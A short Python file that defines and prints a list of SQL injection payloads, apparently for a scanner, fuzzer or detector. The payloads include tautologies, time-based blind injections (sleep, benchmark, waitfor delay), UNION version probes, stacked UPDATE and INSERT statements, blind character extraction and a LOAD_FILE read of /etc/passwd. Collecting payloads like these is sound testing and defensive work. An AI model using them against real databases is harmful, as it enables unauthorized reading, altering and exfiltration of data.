# -*- coding: utf-8 -*-
"SQL Injection patterns"
sql_patterns = [
r"1 OR 1=1",
r"’ OR 1=1 --",
r"” OR 1=1 --’",
r"OR 1=1;",
r"1 AND 1=1",
r"x’ OR ’1’=’1",
r"‘ OR 1 in (@@version)--",
r"‘ UNION (select @@version) --",
r"1 OR sleep(___TIME___)#",
r"’ OR sleep(___TIME___)#",
r"” OR sleep(___TIME___)#",
r"1 or benchmark(10000000,MD5(1))#",
r"’ or benchmark(10000000,MD5(1))#",
r"” or benchmark(10000000,MD5(1))#",
r";waitfor delay '0:0:__TIME__'--",
r");waitfor delay '0:0:__TIME__'--",
r"';waitfor delay '0:0:__TIME__'--",
r"""";waitfor delay '0:0:__TIME__'--""",
r"OR 1=1 ORDER BY table_name DESC",
r"x’; UPDATE table SET value WHERE user=’x",
r"1’; INSERT INTO table VALUES(‘value’,‘value’);--",
r"101 AND (SELECT ASCII(SUBSTR(name,1,1)) FROM table WHERE foo=n)$ --",
r"’ union select null,LOAD_FILE(’../../../../../etc/passwd’),null,null,null --"
]

if __name__ == "__main__":
    print sql_patterns